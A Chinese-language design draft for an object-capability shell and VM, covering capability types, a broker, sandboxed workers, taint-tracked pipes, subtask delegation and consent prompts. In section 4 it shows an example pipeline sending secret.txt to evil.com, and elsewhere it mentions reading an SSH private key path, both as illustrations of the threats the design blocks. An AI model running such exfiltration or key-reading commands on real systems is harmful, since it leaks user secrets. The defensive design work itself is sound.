# OCap Shell / VM 设计草案

本文描述如果重新设计 Bash、编写一个新的 shell 环境，或实现一个新的 VM，应如何从结构上支持 Object Capability（OCap）安全模型。

核心判断：不要“增强 Bash”，而应设计一个 capability-native shell / VM。POSIX shell 的默认语义本身就是 ambient authority：路径是字符串、命令从 `$PATH` 查找、环境变量默认继承、子进程默认继承 fd、网络和 home 默认可见。要实现 OCap，必须重写这些默认值。

核心原则：

```text
没有 capability，就没有资源。
路径、URL、命令名、token 都只是数据，不是权限。
进程、脚本、子任务默认零权限。
所有外部世界访问都经 Capability Broker。
```

---

## 1. Capability-Native Shell

新的 shell 可以称为 `capshell`。它不是 Bash 的语法补丁，而是一个 capability object runtime 的交互界面。

### 1.1 普通值与 capability 分离

Shell 变量必须区分普通值和 capability。

普通字符串不能变成权限：

```sh
let p = "../.ssh/id_rsa"        # 普通字符串
read $p                         # 拒绝：字符串不是 FileCap
```

资源访问必须持有 capability：

```sh
let src = grant dir "./src" read
read $src "main.ts"             # 允许：DirCap + 相对路径
```

Capability 是不可伪造对象，而不是可复制字符串：

```text
DirCap
FileCap
WritePatchCap
DeleteCap
CommandCap
HttpCap
MessageCap
DbCap
CredentialCap
ProcessCap
SubtaskCap
```

Capability 不能被打印成可重放 token，不能写入日志，不能通过字符串拼接构造，不能跨 session 复用。

### 1.2 去掉 cwd / PATH / env 的安全语义

传统 Bash 中：

```sh
cd /tmp
cat foo
npm test
```

`foo` 和 `npm` 都依赖 ambient authority：路径由当前工作目录解释，命令由 `$PATH` 查找，进程继承当前环境。

OCap shell 中应改成：

```sh
let repo = grant dir "." read,write
let npm_test = grant command ["npm", "test"] cwd=$repo once

run $npm_test
```

命令不是通过 `$PATH` 任意解析，而是由 `CommandCap` 指定：

```text
argv 模板
cwd capability
env allowlist
network policy
filesystem caps
timeout
lifetime
```

### 1.3 文件系统 API

不要提供基于绝对路径的权限接口：

```sh
read /absolute/path
write /absolute/path
rm -rf path
```

提供基于 capability 的接口：

```sh
read   DirCap relative_path
write  WritePatchCap diff
delete DeleteCap target
list   DirCap relative_path
```

写入必须 prepare/commit：

```sh
let patch = prepare_write $repo "src/main.ts" < diff.patch
commit $patch
```

`commit` 使用一次性 `WritePatchCap`，并绑定 diff hash、目标路径和生命周期。

### 1.4 网络 API

不要提供裸 `curl` 风格接口：

```sh
curl https://anything
```

提供 origin-scoped capability：

```sh
let api = grant http "https://api.example.com" methods=[GET] paths=["/v1/*"] ttl=10m
http_get $api "/v1/models"
```

`HttpCap` 至少应限制：

- origin
- path pattern
- method
- request / response byte limit
- rate limit
- lifetime
- taint policy

POST、Webhook、邮件、IM、issue comment、PR 发布、DB 写入都属于外发 sink，需要更强的 consent。

### 1.5 命令执行 API

OCap shell 不提供常驻任意 shell。每个命令应由独立的 `CommandCap` 描述：

```sh
let test = grant command ["npm", "test"] cwd=$repo network=none once
run $test
```

破坏性命令必须是具名窄 capability：

```sh
let install = grant package_install manager=npm cwd=$repo network="registry.npmjs.org" once
let del = grant delete path=$repo/"node_modules" recursive=true once
let push = grant git_push remote=origin branch=main force=false once
```

自由 shell 只能作为例外能力：

```sh
let sh = grant shell cwd=$repo read=$repo write=none network=none ttl=5m
run $sh "printf '%s\n' hello"
```

该能力必须每次确认、强审计、默认无网络。

---

## 2. Sandboxed Worker 执行

执行任何二进制时，shell 不直接 fork 一个继承宿主权限的进程，而是启动受限 worker。

```text
capshell
  -> Capability Broker
    -> sandboxed worker
      - only preopened dir caps
      - no user home
      - no default network
      - no ambient env
      - no inherited SSH agent
      - no inherited DB connection
      - seccomp / Landlock / Capsicum / WASI
```

外部程序看到的不是完整文件系统，而是 Broker 映射进去的 capability。

例如：

```sh
let tests = grant command ["npm", "test"] cwd=$repo read=$repo network=none once
run $tests
```

即使 `npm test` 被恶意脚本劫持，worker 也只能访问 `$repo`，不能读 `~/.ssh`，不能联网，不能继承用户凭据。

### 2.1 Worker 最低基线

每个 worker 至少满足：

1. 文件系统限制在授予目录。
2. 网络默认拒绝。
3. 不继承凭据、cookie、agent、keychain。
4. 不继承宿主 DB / MQ 连接。
5. 不可见宿主 process table。
6. 有 timeout、内存、CPU、磁盘配额。
7. 所有 capability 使用都进入审计流。

---

## 3. Capability Broker

Capability Broker 是 shell / VM 的唯一授权入口。

职责：

1. 维护每个 subject 的 capability registry。
2. 生成当前 subject 可见的 command / syscall / tool schema。
3. 校验每次调用是否落在 scope 内。
4. 处理衰减、委托、撤销、过期。
5. 对进入上下文的数据打 taint。
6. 触发用户 consent。
7. 生成审计事件。

### 3.1 Capability 数据结构

```text
Capability {
  id: opaque
  type: dir | file | write_patch | delete | command | http | message | db | credential | process
  subject: subject_id
  operations: read | write | delete | exec | get | post | send | push
  scope: path glob | origin+path | command template | API object | DB view
  lifetime: once | task | session | ttl | usage_count
  quota: bytes | requests | tokens | rate
  provenance: issuer, reason, source_chain
  delegation: none | attenuable | broker_only
  taint_policy: output taint
  revoker: active | revoked | expired
  audit: trace_id, parent_cap_id, issued_at, use_count, last_used_at
}
```

### 3.2 不可伪造性

Capability 必须满足：

- ID 密码学不可猜测。
- 与 subject、session、scope 绑定。
- 脱离 Broker registry 上下文不可调用。
- 真实引用不进入 prompt、日志、环境变量、URL、剪贴板或模型输出。
- 日志只记录不可调用的 audit id。

---

## 4. 管道与信息流

传统管道只传字节：

```sh
cat secret.txt | curl -X POST https://evil.com
```

OCap shell 的管道必须携带 provenance 和 taint：

```text
PipeValue {
  bytes
  provenance
  taint
}
```

示例：

```sh
let secret = grant file ".env" read once
let data = read $secret

post $net data
```

如果 `data` 带有 `local_secret` taint，而 `$net` 是外发 sink，默认拒绝：

```text
拒绝：local_secret -> HttpPostCap
需要 declassification consent
```

### 4.1 Confinement 规则

禁止同一 subject 同时持有：

```text
FileReadCap(secret) + HttpPostCap(*)
FileReadCap(.env) + MessageSendCap
CredentialCap + NetworkCap
BrowserCookieCap + 任意脚本执行
```

正确拆分：

```text
Reader subject：可读敏感文件，无网络
Network subject：可联网，无敏感读
Broker：只允许 schema 化、脱敏后的结构化数据流转
```

敏感数据要外发，必须走显式 declassification consent。

---

## 5. 子 Shell / 子任务 / 子 Agent

传统 Bash 子进程默认继承环境和 fd。OCap shell 中，新主体默认零权限。

```sh
spawn task "lint auth module" {
  caps = [
    repo.scope("src/auth").read_only(),
    llm_budget.split(0.2)
  ]
}
```

没有显式 delegate 的 capability，子任务拿不到。父任务也只能委托自己已有 capability 的衰减版。

要求：

- 子主体默认零权限。
- 委托前必须衰减。
- 委托图对用户可见。
- 子主体输出至少标为红色来源。
- 父 cap 撤销后，派生 cap 级联失效。

---

## 6. OCap VM Syscall 设计

如果实现新的 VM，核心不是 shell 语法，而是 syscall 设计。

传统 OS / VM syscall：

```text
open(path, flags)
connect(host, port)
execve(path, argv, env)
```

OCap VM syscall：

```text
cap_read(cap_index, relative_path)
cap_write(write_cap, bytes)
cap_delete(delete_cap)
cap_connect(http_cap, request)
cap_send(message_cap, message)
cap_exec(command_cap)
cap_delegate(subject, attenuated_cap)
cap_revoke(cap)
cap_derive(cap, attenuation)
```

每个进程有自己的 capability table：

```text
Process {
  subject_id
  cap_table: [opaque refs]
  memory
  stdin: PipeValue
  stdout: PipeValue
  stderr: PipeValue
}
```

Guest 代码不能凭空创建 cap，只能：

1. 接收启动时注入的 cap。
2. 从 Broker 申请 cap。
3. 从已有 cap 衰减派生新 cap。
4. 接收父主体显式委托的 cap。

---

## 7. 用户 Consent

Shell 不能问：

```text
Allow command?
```

而要问：

```text
Agent wants:
  CommandCap ["npm", "install"]
  cwd: ./project
  network: registry.npmjs.org only
  filesystem: ./project read/write
  lifetime: once
  source chain: user request -> package.json
```

按钮应是：

```text
允许一次
本任务同范围
缩小范围
拒绝
```

极高风险操作，例如密钥导出、生产变更、资金操作、不可逆外发，需要带外确认。

Consent 必须绑定到具体 capability，而不是绑定到模糊自然语言目标。

---

## 8. 兼容旧命令

不能直接让旧 Bash 脚本无约束运行。可以提供 `legacy_run` 包装器：

```sh
legacy_run ["make", "test"] with {
  cwd = repo.read_write()
  network = none
  env = ["PATH", "HOME=/sandbox"]
  timeout = 60s
}
```

旧程序在沙箱中运行，只看到映射进去的资源。

不兼容项应明确拒绝：

- 访问绝对路径
- 依赖真实 home
- 读取任意环境变量
- 访问默认网络
- 使用 SSH agent / keychain
- 读取 process table
- 继承宿主 DB / MQ 连接

---

## 9. 最小 MVP

第一版可以只实现：

1. `DirCap` / `FileCap`
2. `WritePatchCap`
3. `CommandCap`
4. `HttpCap`
5. Capability registry
6. 动态 command / tool exposure
7. Sandboxed worker
8. Prepare / commit 写入
9. Taint 标记
10. Revocation
11. Audit log
12. JIT consent

做到这一步，就已经比 Bash 的安全模型强很多。

---

## 10. 关键结论

如果重新设计 Bash，最重要的不是换语法，而是改掉三件事：

```text
路径不是权限。
命令名不是权限。
子进程不继承权限。
```

新的 shell / VM 应该像一个 capability object runtime：shell 只是用户和脚本操作 capability 的界面，真正的安全边界在 Broker、capability table、sandbox worker、taint 信息流和撤销链里。
